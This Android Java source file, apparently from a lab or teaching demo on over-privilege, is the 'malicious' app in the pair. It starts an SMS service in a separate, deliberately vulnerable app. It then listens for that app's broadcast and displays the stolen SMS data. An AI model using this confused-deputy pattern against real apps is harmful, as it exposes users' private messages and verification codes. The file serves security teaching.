package overPrivilege.malicious;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {
    private static final String TAG = "MaliciousAppMainActivity";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Log.d(TAG, "MainActivity onCreate");
        // Envoyer une intention de requête à Benign App
        Intent intent = new Intent();
        intent.setPackage("overPrivilege.java");
        intent.setClassName("overPrivilege.java", "overPrivilege.stringlibrary.SmsService");
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent);
        }
        else{
            startService(intent);
        }

        // Enregistrer le BroadcastReceiver
        IntentFilter filter = new IntentFilter("overPrivilege.vulnerable.SMS_DATA");
        registerReceiver(smsReceiver, filter);
        Log.d(TAG, "BroadcastReceiver registered");
    }


    private BroadcastReceiver smsReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            Log.d(TAG, "Broadcast received");
            if ("overPrivilege.vulnerable.SMS_DATA".equals(intent.getAction())) {
                String smsData = intent.getStringExtra("sms_data");
                TextView smsTextView = findViewById(R.id.smsTextView);
                smsTextView.setText(smsData);
                Log.d(TAG, "SMS data set in TextView");
            } else {
                Log.d(TAG, "Received an unrelated intent");
            }
        }
    };


    @Override
    protected void onStop() {
        super.onStop();
        // Désenregistrer le BroadcastReceiver
        unregisterReceiver(smsReceiver);
        Log.d(TAG, "BroadcastReceiver unregistered");
    }
}
